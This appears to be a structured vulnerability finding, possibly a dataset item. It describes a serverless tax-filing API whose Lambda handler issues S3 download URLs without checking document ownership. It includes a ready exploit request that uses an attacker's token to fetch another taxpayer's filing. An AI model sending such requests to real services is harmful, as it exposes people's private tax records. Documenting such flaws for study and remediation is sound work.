diagnosis: The Lambda handler generates a presigned S3 URL for any documentId passed in event.pathParameters without verifying the document's ownership against event.requestContext.authorizer.claims.sub. An attacker can generate download URLs for tax filings and returns of any taxpayer.
exploit_request:
GET /api/tax-filings/doc_tax_2025_9812/download HTTP/1.1
Host: serverless.taxservice.com
Authorization: Bearer <attacker_cognito_jwt>
